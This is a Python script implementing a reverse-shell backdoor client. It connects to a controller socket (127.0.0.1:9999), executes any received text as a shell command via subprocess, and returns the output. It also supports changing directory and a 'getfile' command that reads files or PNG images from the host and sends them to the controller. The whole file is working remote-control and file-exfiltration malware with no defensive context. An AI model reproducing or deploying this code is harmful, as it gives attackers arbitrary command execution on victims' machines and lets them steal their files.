#!/usr/bin/env python3
import os
import socket 
import tqdm
import subprocess
import re
import cv2


SEPARATOR=","
BUFFER_SIZE= 4096
s    = socket.socket()
host = "127.0.0.1"
port = 9999
print(f"[+] Connecting to {host}:{port}")
s.connect((host,port))

while True:
    data=s.recv(4096)
            
    if len(data) > 0:
    
        if data[:2].decode("utf-8")=='cd':
            os.chdir(data[3:].decode('utf-8'))
            


        if data[:7].decode("utf-8") == 'getfile':
            filename=data[8:].decode("utf-8")

            # get the file size
            
            

            # send the filename and filesize
            s.send(f"{filename}".encode())



        
            if re.search(r"^\w[(\w+)_]+[.]png",filename):
                image = cv2.imread(filename)
                
                s.sendall(image) 
            
            else:
                
                with open(filename, "rb") as f:
                    
                        # read the bytes from the file
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            # file transmitting is done
                            f.close()
                            break
                        # we use sendall to assure transimission in 
                        # busy networks
                        s.sendall(bytes_read)
                        # update the progress bar
                        
        
        
        
        
        
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stdout = subprocess.PIPE,stdin = subprocess.PIPE,stderr = subprocess.PIPE )    
        output_byte = cmd.stdout.read() + cmd.stderr.read()
     
        output_str=str(output_byte,'utf-8')
        pwd=os.getcwd() + ">"
        s.send(str.encode(output_str + pwd) )
             
        #showing this to client 
        # print(output_str)


